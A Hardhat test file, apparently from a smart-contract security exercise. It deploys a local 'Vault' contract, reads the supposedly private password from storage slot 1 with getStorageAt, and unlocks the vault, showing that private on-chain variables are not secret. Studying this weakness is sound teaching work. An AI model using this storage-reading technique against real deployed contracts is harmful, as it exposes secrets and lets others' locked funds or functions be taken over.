const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Vault", function () {
  let deployer;
  let hacker;
  let tester;

  it("Should hack the private variable containing the password", async function () {
    // 🔨 Addresses
    [deployer, hacker, tester] = await ethers.getSigners();

    const pwd = "password123";
    const pwdByte32 = ethers.utils.formatBytes32String(pwd);
    console.log("🔑 Initial password (string):", pwd);
    console.log("🔑 Initial password (byte32):", pwdByte32);

    // 📗 Contract to be hacked
    const Contract = await ethers.getContractFactory("Vault", deployer);
    const contract = await Contract.connect(deployer).deploy(pwdByte32);
    await contract.deployed();

    // 👿 Hacking the contract
    // 📖 https://docs.ethers.io/v5/api/providers/provider/
    let pwdHackedByte32 = await ethers.provider.getStorageAt(
      contract.address,
      1
    );
    let pwdHacked = ethers.utils.parseBytes32String(pwdHackedByte32);

    // 🗣 Logging status
    console.log("🔑 Hacked password (string):", pwdHacked);
    console.log("🔑 Hacked password (byte32):", pwdHackedByte32);
    let locked = await contract.locked();
    console.log("🔑 Lock status before unlocking:", locked);

    // Unlock the contract
    let unlockTx = await contract.connect(deployer).unlock(pwdHackedByte32);
    await unlockTx.wait((confirms = 1));

    // 🗣 Logging status
    locked = await contract.locked();
    console.log("🔑 Lock status after unlocking:", locked);

    // ✅ Check if the hack was successful
    expect(pwdHacked).to.be.eq(pwd);
    expect(locked).to.be.false;
  });
});
